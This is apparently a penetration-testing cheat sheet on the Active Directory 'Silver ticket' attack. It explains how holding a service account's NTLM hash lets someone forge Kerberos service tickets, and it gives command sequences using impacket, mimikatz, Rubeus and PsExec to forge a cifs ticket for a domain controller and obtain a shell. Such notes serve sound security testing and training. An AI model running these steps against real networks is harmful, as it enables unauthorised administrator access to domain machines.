# Silver ticket

## Overview
The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash).** Thus, it is possible to gain access to that service by forging a custom TGS as any user.     
In this case, the NTLM hash of a computer account (which is kind of a user account in AD) is owned. Hence, it is possible to craft a ticket in order to get into that machine with administrator privileges through the SMB service. The computer accounts reset their passwords every 30 days by default.

## Tools needed
- [getPac](https://github.com/fortra/impacket/blob/master/examples/getPac.py)
- [ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe)
- [PSExec (from Sysinternals Suite)](https://learn.microsoft.com/en-gb/sysinternals/downloads/sysinternals-suite)

## Exploitation
### Remote
```bash
# Get the ccache file
python ticketer.py -nthash <nthash> -domain-sid <sid> -domain domain.local -spn cifs/dc.domain.local <user>

# Set environment variable
export KRB5CCNAME=user.ccache

# Get shell
python psexec.py domain.local/user@dc.domain.local -k -no-pass
```

### Local
```powershell
# Create the ticket
mimikatz.exe "kerberos::golden /domain:domain.local /sid:<sid> /rc4:<hash> /user:<user> /service:cifs /target:dc.domain.local"

# Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Get a shell
.\PsExec.exe -accepteula \\dc.domain.local cmd
```

## References
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)